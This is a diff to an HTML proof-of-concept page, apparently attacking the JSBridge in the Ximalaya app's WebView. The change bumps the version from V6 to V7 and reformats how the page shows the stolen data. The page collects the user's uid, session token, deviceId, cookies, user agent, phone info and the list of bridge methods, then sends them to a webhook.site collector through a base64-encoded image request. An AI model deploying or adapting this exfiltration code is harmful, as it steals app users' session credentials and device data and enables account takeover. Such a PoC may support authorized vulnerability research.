@@ -16,7 +16,7 @@
  #wb a{color:#58a6ff}
 </style></head>
 <body>
-<h3>[PoC] Ximalaya WebView JSBridge - XM-POC-V6</h3>
+<h3>[PoC] Ximalaya WebView JSBridge - XM-POC-V7</h3>
 <div class="card" id="wb"><h4>收集端地址（电脑浏览器打开查看全部数据）</h4></div>
 <div class="card"><h4>① 身份凭证（jscall.appReady）</h4><div id="cred" class="row"><span class="k">读取中...</span></div></div>
 <div class="card"><h4>② 设备信息</h4><div id="dev" class="row"></div></div>
@@ -26,6 +26,7 @@
 function b64(s){return btoa(unescape(encodeURIComponent(s)));}
 function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;');}
 function row(k,v){return '<div class="row"><span class="k">'+k+': </span><span class="v">'+esc(v)+'</span></div>';}
+function rowh(k,html){return '<div class="row"><span class="k">'+k+': </span><span class="v">'+html+'</span></div>';}
 var WH='5f2d3f7d-943e-4e9e-bdd7-8fffa0e8cddd';
 var wburl='https://webhook.site/#/'+WH;
 document.getElementById('wb').innerHTML+='<div class="row"><a href="'+wburl+'">'+wburl+'</a></div>';
@@ -44,11 +45,16 @@ if(ar.err){c.innerHTML=row('appReady错误',ar.err);}
 else{
  var tk=String(ar.token||'');
  c.innerHTML=
-  row('uid',ar.uid)+'-'+row('token','<span class="hl">'+esc(tk.slice(0,24))+'...['+tk.length+'字符，完整见收集端]</span>')+
-  row('deviceId',ar.deviceId)+'-'+row('版本',ar.version)+'-'+row('系统',ar.platformVersion);
+  row('uid',ar.uid)+
+  rowh('token','<span class="hl">'+esc(tk.slice(0,24))+'...['+tk.length+'字符，完整见收集端]</span>')+
+  row('deviceId',ar.deviceId)+
+  row('版本',ar.version)+
+  row('系统',ar.platformVersion);
 }
 document.getElementById('dev').innerHTML=
- row('UA',navigator.userAgent)+'-'+row('cookie',cookie||'(空)')+'-'+row('phoneinfo',pi);
+ row('UA',navigator.userAgent)+
+ row('cookie',cookie||'(空)')+
+ row('phoneinfo',pi);
 var b=document.getElementById('br'),total=0;
 for(var n in bridges){var list=bridges[n]||[];
  total+=list.length;
@@ -57,7 +63,7 @@ for(var n in bridges){var list=bridges[n]||[];
 }
 document.getElementById('cnt').textContent='共'+total+'个';
 
-var rep={src:'poc-v6',url:location.href,ua:navigator.userAgent,cookie:cookie,
+var rep={src:'poc-v7',url:location.href,ua:navigator.userAgent,cookie:cookie,
          bridge:bridges,phoneinfo:pi,appready:JSON.stringify(ar)};
 new Image().src='https://webhook.site/'+WH+'?tag=report&d='+b64(JSON.stringify(rep));
 document.getElementById('st').innerHTML='<span class="ok">[√] 已外带至 webhook.site（'+WH+'）</span>';
